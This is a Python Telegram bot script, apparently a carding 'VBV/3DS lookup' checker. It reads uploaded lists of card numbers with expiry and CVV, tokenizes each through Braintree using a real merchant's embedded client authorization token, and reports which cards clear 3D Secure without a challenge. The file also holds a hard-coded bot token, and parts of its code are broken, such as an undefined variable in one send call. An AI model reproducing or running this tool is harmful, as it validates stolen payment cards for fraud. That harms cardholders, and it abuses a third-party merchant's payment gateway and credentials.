
import requests
import telebot
from telebot import types
import telebot,os
import time
import re
import base64
import user_agent
from getuseragent import UserAgent
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
photo_url = 'https://t.me/Borsavccclog'
admin = 5983644996
token = "7524721147:AAGMkCxTNQ1Us5I-7VD6dPW-LGMopLQqmL8"
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
    keyboard = types.InlineKeyboardMarkup()
    cmds_button = types.InlineKeyboardButton(text="𝐂𝐌𝐃𝐒", callback_data="cmds")
    keyboard.add(cmds_button)
    bot.send_photo(
        message.chat.id,
        photo=photo_url,
        caption="🤖 Bot Status: Active ✅ Join <a href=\"https://t.me/TEAM_HOUDA\">Here</a> to Get Updates And Keys For The Bot. By <a href=\"t.me/TEAM_HOUDA\">𓆩⏤͟͞TEAM 7OUDA𓆪</a> If You Want to Run a Bot In Your Group, Make Sure The Bot is The Admin 🎁",
        reply_markup=keyboard
    )
@bot.callback_query_handler(func=lambda call: call.data == 'cmds')
def cmds_callback(call):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        types.InlineKeyboardButton("𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url="https://whatsapp.com/channel/0029VaAWr3x5PO0y7qLfcR26"),
        types.InlineKeyboardButton("𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", url="https://whatsapp.com/channel/0029VaAWr3x5PO0y7qLfcR26a")
    )

    try:
        #Edit the comment attached to the image instead of deleting the message
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=f'''<b> 

━━━━━━━━━━━━━━━━━━━━━━━━

✅ 𝟑𝐃 𝐋𝐎𝐎𝐊𝐔𝐏
<code>/vbv</code> 𝐍𝐔𝐌𝐁𝐄𝐑|𝐌𝐌|𝐘𝐘|𝐂𝐕𝐕

━━━━━━━━━━━━━━━━━━━━━━━━</b>''',
            parse_mode='HTML',
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"An error occurred: {e}")


import re,requests
def brn(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
			yy = yy.split("20")[1]
	r = requests.session()
	user = user_agent.generate_user_agent()
	
	
	
	
	

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjgyNDAxMzAsImp0aSI6ImYwNjA4NThlLWI4MTAtNGI1MS1iZTI0LWNiYTU2MTFmNzI0ZiIsInN1YiI6ImNjenMzcTQ3czlzbjRtOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNjenMzcTQ3czlzbjRtOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.s6KDZpuW0flNh1QUEg_RANL5L76yIFQhDC1Beci45-dRAl_CpUyWLYCPXlhE4OK6xxgXeoIrwzmC_S9XYHZGZQ',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '2589b19d-4228-4255-93c9-ebddab7e232c',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)



	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	

	

	
	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/json',
    'origin': 'https://somersetandwood.com',
    'referer': 'https://somersetandwood.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'amount': '48.00',
    'additionalInfo': {
        'billingLine1': 'New York',
        'billingCity': 'New York',
        'billingState': 'AA',
        'billingPostalCode': '10080',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '13478653020',
        'billingGivenName': 'Hoda',
        'billingSurname': 'Alaa',
    },
    'dfReferenceId': '0_7c1a4d27-c28e-456b-9907-ab64b192a848',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.79.1',
        'cardinalDeviceDataCollectionTimeElapsed': 411,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjgyNDAxMzAsImp0aSI6ImYwNjA4NThlLWI4MTAtNGI1MS1iZTI0LWNiYTU2MTFmNzI0ZiIsInN1YiI6ImNjenMzcTQ3czlzbjRtOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNjenMzcTQ3czlzbjRtOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.s6KDZpuW0flNh1QUEg_RANL5L76yIFQhDC1Beci45-dRAl_CpUyWLYCPXlhE4OK6xxgXeoIrwzmC_S9XYHZGZQ',
    'braintreeLibraryVersion': 'braintree/web/3.79.1',
    '_meta': {
        'merchantAppId': 'somersetandwood.com',
        'platform': 'web',
        'sdkVersion': '3.79.1',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '2589b19d-4228-4255-93c9-ebddab7e232c',
    },
}

	response = requests.post(
    f'https://api.braintreegateway.com/merchants/cczs3q47s9sn4m9y/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)



	time.sleep(9)
	try:
		vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	except KeyError:
		return 'Unknown Error ⚠️'

	
	if 'authenticate_successful' in vbv:
		return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
		return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'lookup Error ⚠️'
	return vbv
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	ch = 0
	otp = 0
	last = 0
	ko = (bot.reply_to(message, "'𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
			
				try:
				                data = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
				                bank = data.get('bank', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                country_flag = data.get('country', {}).get('emoji', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                country = data.get('country', {}).get('name', '𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				                brand = data.get('scheme', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				                card_type = data.get('type', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				                url = data.get('bank', {}).get('url', '𝒖𝒏𝒌𝒎𝒏𝒘𝒏')
				except Exception:
					bank = country_flag = country = brand = card_type = url = '𝒖𝒏𝒌𝒎𝒏𝒘𝒏'
				try:
					last = str(brn(cc))
				except Exception as e:
					print(e)
				mes = types.InlineKeyboardMarkup(row_width=1)
				mero = types.InlineKeyboardButton(f"{last}", callback_data='u8')
				cm1 = types.InlineKeyboardButton(f"{cc}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"𝗢𝘁𝗽 ⛔ {ch}", callback_data='x')
				me = types.InlineKeyboardButton(f"𝐏𝐚𝐬𝐬𝐞𝐝  ✅ {otp}", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ {dd}", callback_data='x')
				stop = types.InlineKeyboardButton(f"𝐒𝐓𝐎𝐏 ⚠️ ", callback_data='u8')
				mes.add(mero,cm1, me, cm2, cm3 ,stop)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛''', reply_markup=mes)
				
				msgs = f'''𝐎𝐓𝐏✅ 

- 𝐂𝐚𝐫𝐝 ⇾ {cc} 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Lookup
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾{last}
━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {cc[:6]} - {card_type} - {brand} 
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank} 
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country} - {country_flag} 
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@H_o_d_aa』'''


				msg = f'''𝐏𝐚𝐬𝐬𝐞𝐝 ✅ 
- 𝐂𝐚𝐫𝐝 ⇾ {cc} 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ Braintree Lookup
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾{last}
━━━━━━━━━━━━━━━━
- 𝗕𝗜𝗡 ⇾ {cc[:6]} - {card_type} - {brand} 
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank} 
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country} - {country_flag} 
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@H_o_d_aa』'''
				#print(last)
				if "3DS Authenticate Attempt Successful ✅" in last or '3DS Authenticate Successful ✅' in last or 'authenticate_attempt_successful' in last:
					otp += 1
				elif '3DS Challenge Required ❌' in last or '3DS Authenticate Frictionless Failed ❌' in last or '3DS Authenticate Rejected ❌' in last:
					ch += 1
					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msgs}</strong>",parse_mode="html",reply_markup=key)
					key = types.InlineKeyboardMarkup();bot.send_message(f"{send_message}", f"<strong>{msgs}</strong>",parse_mode="html",reply_markup=key)
				else:
					dd += 1
					time.sleep(9)
	except:
		pass
print("anish")
bot.polling()

